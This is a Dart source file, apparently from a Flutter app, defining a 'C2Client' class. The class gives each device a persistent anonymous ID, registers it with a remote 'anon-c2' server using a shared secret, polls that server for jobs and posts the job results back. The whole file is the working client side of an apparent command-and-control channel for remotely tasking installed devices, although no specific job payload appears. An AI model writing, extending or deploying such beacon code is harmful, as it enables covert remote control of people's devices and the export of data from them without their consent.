import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:uuid/uuid.dart';
import 'package:shared_preferences/shared_preferences.dart';

const _deviceIdKey = 'anon_device_id';

class C2Client {
  C2Client({String? base, String? secret})
      : baseUrl = (base ??
                const String.fromEnvironment(
                  'C2_URL',
                  defaultValue: 'https://anon-c2.example.workers.dev',
                ))
            .replaceAll(RegExp(r'/$'), ''),
        secret = secret ??
            const String.fromEnvironment(
              'DEVICE_SECRET',
              defaultValue: 'change-me',
            );

  final String baseUrl;
  final String secret;
  String? _deviceId;

  Future<String> deviceId() async {
    if (_deviceId != null) return _deviceId!;
    final prefs = await SharedPreferences.getInstance();
    var id = prefs.getString(_deviceIdKey);
    if (id == null || id.isEmpty) {
      id = const Uuid().v4();
      await prefs.setString(_deviceIdKey, id);
    }
    _deviceId = id;
    return id;
  }

  Map<String, String> get _headers => {
        'Content-Type': 'application/json',
        'X-Device-Secret': secret,
      };

  Future<void> register(Map<String, dynamic> meta) async {
    final id = await deviceId();
    final r = await http.post(
      Uri.parse('$baseUrl/device/register'),
      headers: _headers,
      body: jsonEncode({'deviceId': id, 'meta': meta}),
    );
    if (r.statusCode >= 300) {
      throw Exception('register failed: ${r.statusCode} ${r.body}');
    }
  }

  Future<List<Map<String, dynamic>>> poll() async {
    final id = await deviceId();
    final r = await http.get(
      Uri.parse('$baseUrl/device/poll/$id'),
      headers: _headers,
    );
    if (r.statusCode >= 300) return [];
    final data = jsonDecode(r.body) as Map<String, dynamic>;
    final jobs = data['jobs'];
    if (jobs is! List) return [];
    return jobs.map((e) => Map<String, dynamic>.from(e as Map)).toList();
  }

  Future<void> reportResult({
    required String jobId,
    required String name,
    required bool ok,
    dynamic data,
    String? error,
  }) async {
    final id = await deviceId();
    await http.post(
      Uri.parse('$baseUrl/device/result'),
      headers: _headers,
      body: jsonEncode({
        'deviceId': id,
        'jobId': jobId,
        'name': name,
        'ok': ok,
        'data': data,
        'error': error,
        'ts': DateTime.now().toUtc().toIso8601String(),
      }),
    );
  }
}
